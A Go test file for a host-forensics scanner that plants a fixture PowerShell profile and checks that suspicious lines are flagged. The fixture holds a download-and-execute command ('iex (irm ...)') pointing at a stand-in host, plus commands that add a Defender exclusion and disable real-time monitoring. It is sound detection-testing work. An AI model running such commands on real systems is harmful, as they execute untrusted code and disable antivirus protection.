package hostforensics

import (
	"os"
	"path/filepath"
	"testing"
)

func TestScanPowerShell(t *testing.T) {
	home := t.TempDir()
	psDir := filepath.Join(home, ".config", "powershell")
	if err := os.MkdirAll(psDir, 0o755); err != nil {
		t.Fatal(err)
	}
	content := `# PowerShell profile fixture for chaindora tests.
$env:PATH += ";C:\Tools"
Set-Alias ll Get-ChildItem

# Below is suspicious — fake URL, would-not-execute payload.
iex (irm https://evil.invalid/install.ps1)

# Base64 obfuscation
$payload = [Convert]::FromBase64String("Zm9v")

# AV bypass
Add-MpPreference -ExclusionPath "C:\Tools"

# Defender disable
Set-MpPreference -DisableRealtimeMonitoring $true

# Comment below MUST NOT match:
# iex (irm bad.invalid/x.ps1)
`
	profile := filepath.Join(psDir, "Microsoft.PowerShell_profile.ps1")
	if err := os.WriteFile(profile, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}

	got := scanPowerShell(home)
	ids := map[string]int{}
	for _, f := range got {
		ids[f.VulnID]++
	}
	for _, want := range []string{
		"HOST-POWERSHELL-IEX-WEB",
		"HOST-POWERSHELL-BASE64",
		"HOST-POWERSHELL-AV-EXCLUSION",
		"HOST-POWERSHELL-AV-DISABLE",
	} {
		if ids[want] == 0 {
			t.Errorf("missing %s; got %v", want, ids)
		}
	}
	if ids["HOST-POWERSHELL-IEX-WEB"] > 1 {
		t.Errorf("comment-line matched as iex-web (count=%d) — comments must be skipped", ids["HOST-POWERSHELL-IEX-WEB"])
	}
}

func TestScanPowerShellEmpty(t *testing.T) {
	home := t.TempDir()
	if got := scanPowerShell(home); len(got) != 0 {
		t.Errorf("no profile files → 0 findings, got %d", len(got))
	}
}
